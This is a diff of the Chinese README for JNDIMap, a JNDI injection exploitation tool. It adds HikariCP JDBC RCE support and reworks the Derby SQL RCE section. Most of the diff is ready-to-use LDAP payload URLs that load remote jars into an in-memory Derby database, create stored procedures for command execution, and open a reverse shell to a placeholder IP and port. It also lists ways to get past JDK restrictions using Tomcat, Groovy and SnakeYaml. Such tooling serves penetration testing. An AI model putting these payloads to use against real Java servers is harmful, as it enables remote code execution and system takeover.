@@ -9,7 +9,7 @@ JNDIMap 是一个 JNDI 注入利用工具, 支持 RMI 和 LDAP 协议, 包含多
 - 原生反弹 Shell (支持 Windows)
 - 加载自定义 Class 字节码
 - Tomcat/Groovy/SnakeYaml Bypass
-- Commons/Tomcat DBCP, Druid JDBC RCE
+- Commons/Tomcat DBCP, Druid, HikariCP JDBC RCE
 - NativeLibLoader 加载动态链接库
 - MLet 探测可用 Class
 - LDAP 反序列化
@@ -79,9 +79,11 @@ ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/4444
 
 通过以下方式绕过高版本 JDK 限制, 支持 Basic 所有功能
 
-- Tomcat BeanFactory + ELProcessor (Tomcat 版本需小于 8.5.79)
+- Tomcat ELProcessor
 - Groovy ClassLoader/Shell
 - SnakeYaml
+
+上述方式均依赖于 BeanFactory, 因此 Tomcat 版本需小于 8.5.79
 
 ```bash
 # Tomcat Bypass
@@ -140,9 +142,9 @@ gcc -shared -fPIC exp.c -o exp.dylib
 
 ### JDBC RCE
 
-支持 Commons/Tomcat DBCP, Druid JDBC RCE
+支持 Commons/Tomcat DBCP, Druid, HikariCP JDBC RCE
 
-将以下 URL 中的 Factory 替换为 CommonsDbcp1, CommonsDbcp2, TomcatDbcp1, TomcatDbcp2, Druid 其中之一
+将以下 URL 中的 Factory 替换为 CommonsDBCP1, CommonsDBCP2, TomcatDBCP1, TomcatDBCP2, Druid, HikariCP 其中之一
 
 #### PostgreSQL
 
@@ -166,9 +168,47 @@ ldap://127.0.0.1:1389/Factory/H2/JavaScript/open -a Calculator
 
 #### Derby
 
+**Derby SQL RCE**
+
+支持执行命令和原生反弹 Shell
+
+```bash
+# 1. 加载远程 jar 并创建相关存储过程 (会自动创建数据库)
+ldap://127.0.0.1:1389/Factory/Derby/Install/<database>
+
+# 2. 执行命令/原生反弹 Shell
+ldap://127.0.0.1:1389/Factory/Derby/Command/<database>/open -a Calculator
+ldap://127.0.0.1:1389/Factory/Derby/ReverseShell/<database>/ReverseShell/127.0.0.1/4444
+
+# 3. 删除数据库以释放内存
+ldap://127.0.0.1:1389/Factory/Derby/Drop/<database>
+```
+
+注意 HikariCP 的 connectionInitSql 参数不支持一次性执行多条 SQL 语句, 因此上述 **Install** 过程需要分开写
+
+```bash
+# 1. 加载远程 jar (会自动创建数据库)
+ldap://127.0.0.1:1389/HikariCP/Derby/InstallJar/<database>
+
+# 2. 将 jar 加入 classpath
+ldap://127.0.0.1:1389/HikariCP/Derby/AddClassPath/<database>
+
+# 3. 创建命令执行的存储过程
+ldap://127.0.0.1:1389/HikariCP/Derby/CreateCmdProc/<database>
+
+# 4. 创建反弹 Shell 的存储过程
+ldap://127.0.0.1:1389/HikariCP/Derby/CreateRevProc/<database>
+
+# 后续 JNDI URL 同上
+```
+
+为了防止恶意 jar 落地, JNDIMap 选择使用 `jdbc:derby:memory:<database>` 形式的 JDBC URL 以在内存中创建数据库
+
+因此最好不要多次执行 Install/InstallJar 路由, 并且记得 Drop 数据库以释放内存
+
 **Derby 主从复制反序列化 RCE**
 
-_JNDI 本身就支持反序列化, 意义不大_
+JNDI 本身就支持反序列化, 意义不大, 可能在某些比较极限的场景下有用 (例如过滤了 LDAP 协议, 仅支持 RMI)
 
 ```bash
 # 1. 创建内存数据库
@@ -194,22 +234,6 @@ Usage: java -cp JNDIMap.jar map.jndi.server.DerbyServer [-p <port>] [-g <gadget>
 `-f`: 指定自定义序列化数据文件
 
 `-h`: 显示 Usage 信息
-
-**Derby SQL RCE**
-
-支持执行命令和原生反弹 Shell
-
-```bash
-# 1. 加载远程 Jar (会自动创建内存数据库)
-ldap://127.0.0.1:1389/Factory/Derby/InstallJar/<database>
-
-# 2. 执行命令/原生反弹 Shell
-ldap://127.0.0.1:1389/Factory/Derby/Command/<database>/open -a Calculator
-ldap://127.0.0.1:1389/Factory/Derby/ReverseShell/<database>/ReverseShell/127.0.0.1/4444
-
-# 3. 删除内存数据库以释放内存
-ldap://127.0.0.1:1389/Factory/Derby/Drop/<database>
-```
 
 ### Deserialize
 
